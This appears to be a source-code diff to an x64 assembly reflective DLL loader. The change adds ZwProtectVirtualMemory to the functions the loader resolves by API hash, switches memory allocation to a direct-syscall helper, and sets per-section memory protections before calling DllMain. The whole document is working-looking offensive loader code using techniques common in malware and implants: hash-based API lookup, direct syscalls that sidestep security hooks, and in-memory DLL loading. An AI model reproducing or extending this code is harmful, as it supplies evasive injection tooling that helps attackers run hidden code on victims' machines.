@@ -18,6 +18,7 @@ NTDLLDLL_HASH               EQU 0x3CFA685D
 LOADLIBRARYA_HASH           EQU 0xEC0E4E8E
 GETPROCADDRESS_HASH         EQU 0x7C0DFCAA
 ZWALLOCATEVIRTUALMEMORY_HASH EQU 0xD33D4AED
+ZWPROTECTVIRTUALMEMORY_HASH EQU 0xBC3F4D89
 NTFLUSHINSTRUCTIONCACHE_HASH EQU 0x534C0AB8
 
 ; PE / reloc constants
@@ -55,6 +56,7 @@ DLL_PROCESS_ATTACH          EQU 1
 ;   [rbp - 128] = uiValueE
 ;   [rbp - 136] = usCounter  (USHORT, stored as qword)
 ;   [rbp - 144] = dwHashValue
+;   [rbp - 152] = pZwProtectVirtualMemory
 ; ---------------------------------------------------------------------------
 %define pLoadLibraryA           qword [rbp -   8]
 %define pGetProcAddress         qword [rbp -  16]
@@ -74,6 +76,7 @@ DLL_PROCESS_ATTACH          EQU 1
 %define uiValueE                qword [rbp - 128]
 %define usCounter               qword [rbp - 136]
 %define dwHashValue             qword [rbp - 144]
+%define pZwProtectVirtualMemory  qword [rbp - 152]
 
 ; ============================================================================
 ; Entry: ReflectiveLoader()
@@ -101,6 +104,7 @@ ReflectiveLoader:
     mov     pGetProcAddress,          rax
     mov     pZwAllocateVirtualMemory, rax
     mov     pNtFlushInstructionCache, rax
+    mov     pZwProtectVirtualMemory,  rax
     xor     rcx, rcx ; disable base address as parameter. compatible with standard reflective loader.
     test    rcx, rcx
     jnz     .found_base
@@ -248,14 +252,15 @@ ReflectiveLoader:
     jmp     .k32_export_loop
 
     ; ------------------------------------------------------------------
-    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory
+    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory,
+    ;                      ZwProtectVirtualMemory
     ; ------------------------------------------------------------------
 .process_ntdll:
     mov     rax, uiValueA              ; restore module entry pointer
     mov     r13, [rax + 0x20]          ; DllBase
     mov     uiBaseAddress, r13
     call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
-    mov     usCounter, 2               ; we want 2 functions
+    mov     usCounter, 3               ; we want 3 functions
 
 .ntdll_export_loop:
     ; bounds check
@@ -275,6 +280,8 @@ ReflectiveLoader:
     je      .ntdll_store_func
     cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
     je      .ntdll_store_func
+    cmp     eax, ZWPROTECTVIRTUALMEMORY_HASH
+    je      .ntdll_store_func
     jmp     .ntdll_next
 
 .ntdll_store_func:
@@ -293,7 +300,12 @@ ReflectiveLoader:
     mov     pNtFlushInstructionCache, r14
     jmp     .ntdll_dec_counter
 .ntdll_try_zw:
+    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
+    jne     .ntdll_try_zw_prot
     mov     pZwAllocateVirtualMemory, r14
+    jmp     .ntdll_dec_counter
+.ntdll_try_zw_prot:
+    mov     pZwProtectVirtualMemory, r14
 .ntdll_dec_counter:
     mov     rax, usCounter
     dec     rax
@@ -314,6 +326,9 @@ ReflectiveLoader:
     test    rax, rax
     jz      .next_module
     mov     rax, pZwAllocateVirtualMemory
+    test    rax, rax
+    jz      .next_module
+    mov     rax, pZwProtectVirtualMemory
     test    rax, rax
     jz      .next_module
     mov     rax, pNtFlushInstructionCache
@@ -350,7 +365,8 @@ ReflectiveLoader:
     lea     r9, [rsp + 0x40]           ; pRegionSize
     mov     dword [rsp + 0x20], MEM_RESERVE | MEM_COMMIT
     mov     dword [rsp + 0x28], PAGE_EXECUTE_READWRITE
-    call    pZwAllocateVirtualMemory
+    mov     r10, pZwAllocateVirtualMemory
+    call    .direct_syscall
     mov     rax, [rsp + 0x38]          ; retrieve allocated BaseAddress
     add     rsp, 0x48
     mov     uiBaseAddress, rax         ; save new base
@@ -551,10 +567,75 @@ ReflectiveLoader:
     jmp     .reloc_block_loop
 
     ; =========================================================================
-    ; STEP 6: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+    ; STEP 6: set correct memory protections per section
     ; =========================================================================
 .step6:
     ; re-derive NT header (r12 may have been clobbered in reloc loop)
+    mov     rcx, uiBaseAddress
+    mov     eax, dword [rcx + 0x3C]
+    lea     r12, [rcx + rax]
+
+    ; walk section headers
+    movzx   rax, word [r12 + 0x14]    ; SizeOfOptionalHeader
+    lea     r13, [r12 + 0x18 + rax]   ; first IMAGE_SECTION_HEADER
+    movzx   r15d, word [r12 + 0x06]   ; NumberOfSections
+
+.protect_section_loop:
+    test    r15d, r15d
+    jz      .step7
+
+    ; skip if VirtualSize is 0
+    mov     eax, dword [r13 + 0x08]   ; VirtualSize
+    test    eax, eax
+    jz      .protect_next_section
+
+    ; derive protection from Characteristics (offset 0x24)
+    ; bits: 29=EXECUTE, 30=READ, 31=WRITE -> shift to bits 0,1,2
+    mov     eax, dword [r13 + 0x24]   ; Characteristics
+    shr     eax, 29
+    and     eax, 0x7                   ; 3-bit index: XRW
+
+    ; inline lookup: 3-bit index -> Windows memory protection constant
+    lea     rbx, [rel .prot_table]
+    movzx   ebx, byte [rbx + rax]     ; ebx = NewProtect
+    jmp     .do_protect
+.prot_table:
+    ;       ---   X     R     XR    W     XW    RW    XRW
+    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40
+.do_protect:
+
+    ; ZwProtectVirtualMemory(-1, &BaseAddr, &RegionSize, NewProtect, &OldProtect)
+    sub     rsp, 0x48
+    ; local BaseAddress = uiBaseAddress + section.VirtualAddress
+    mov     eax, dword [r13 + 0x0C]   ; section VirtualAddress RVA
+    mov     rcx, uiBaseAddress
+    add     rcx, rax
+    mov     [rsp + 0x30], rcx          ; local BaseAddress
+    ; local RegionSize = section.VirtualSize
+    mov     eax, dword [r13 + 0x08]   ; VirtualSize
+    mov     [rsp + 0x38], rax          ; local RegionSize
+    ; local OldProtect
+    mov     dword [rsp + 0x40], 0      ; OldProtect = 0
+    mov     rcx, -1                    ; ProcessHandle = NtCurrentProcess
+    lea     rdx, [rsp + 0x30]          ; &BaseAddress
+    lea     r8, [rsp + 0x38]           ; &RegionSize
+    mov     r9d, ebx                   ; NewProtect
+    lea     rax, [rsp + 0x40]
+    mov     [rsp + 0x20], rax          ; 5th param: &OldProtect
+    mov     r10, pZwProtectVirtualMemory
+    call    .direct_syscall
+    add     rsp, 0x48
+
+.protect_next_section:
+    add     r13, 40                    ; next section header
+    dec     r15d
+    jmp     .protect_section_loop
+
+    ; =========================================================================
+    ; STEP 7: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+    ; =========================================================================
+.step7:
+    ; re-derive NT header (r12 may have been clobbered in protect loop)
     mov     rcx, uiBaseAddress
     mov     eax, dword [rcx + 0x3C]
     lea     r12, [rcx + rax]
@@ -595,9 +676,9 @@ ReflectiveLoader:
     pop     rbp
     ret
 
-.direct_syscall_call:
+.direct_syscall:
     ; ========================================================================
-    ; HELPER: .direct_syscall_call
+    ; HELPER: .direct_syscall
     ; IN: r10 = Zw function address
     ; ========================================================================
     mov eax, dword [r10 + 0x4]
